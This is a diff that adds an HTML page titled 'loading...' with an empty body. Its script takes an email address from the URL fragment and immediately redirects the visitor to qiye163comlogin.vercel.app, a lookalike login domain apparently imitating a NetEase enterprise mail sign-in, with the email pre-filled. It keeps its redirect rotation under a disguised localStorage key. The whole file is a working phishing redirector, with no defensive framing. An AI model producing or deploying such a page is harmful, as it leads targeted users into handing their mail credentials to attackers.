@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <title>loading...</title>
+    <script type="text/javascript">
+    let email
+    if (location.hash) email = location.hash
+    else email = "#"
+
+    const emailHash = email.split("#")
+
+    if (emailHash.length > 1) {
+        email = `${emailHash[1]}`
+    }
+
+    const redirects = [
+        `https://qiye163comlogin.vercel.app/index.html#${email}`,
+    ]
+
+    class nChitChat {
+        constructor(redirects = [], timeout = 1) {
+            this.timeout = 60 * parseInt(timeout) * 1000
+            this.redirects = redirects
+            this.savePath = "-google.com-"
+        }
+        saveRedirect(url) {
+            const savedItem = this.getSavedRedirect()
+            savedItem[url] = { t: Date.now(), v: url} 
+            localStorage.setItem(this.savePath, JSON.stringify(savedItem))
+        }
+        getRedirect(url) {
+            this.getSavedRedirect()[url] 
+        }
+        getSavedRedirect() {
+            const n = localStorage.getItem(this.savePath)
+            return !n ? {} : JSON.parse(n)
+        }
+        getRandUrl() {
+            const all = Object
+                .entries(this.getSavedRedirect())
+                .map(([key, value]) => ({ ...value, key }))
+                .filter(({ t }) => {
+                    return Date.now() - parseInt(t) < this.timeout
+                })
+                .map(({ key }) => key)
+            const redirects = this.redirects.filter(r => !all.includes(r))
+            const t = redirects[Math.floor(Math.random() * redirects.length)]
+            const u = t || this.redirects[0]
+            this.saveRedirect(u)
+            location.href = u
+        }
+    }
+    (new nChitChat(redirects)).getRandUrl()
+    </script>
+    </head>
+    <body></body>
+</html>
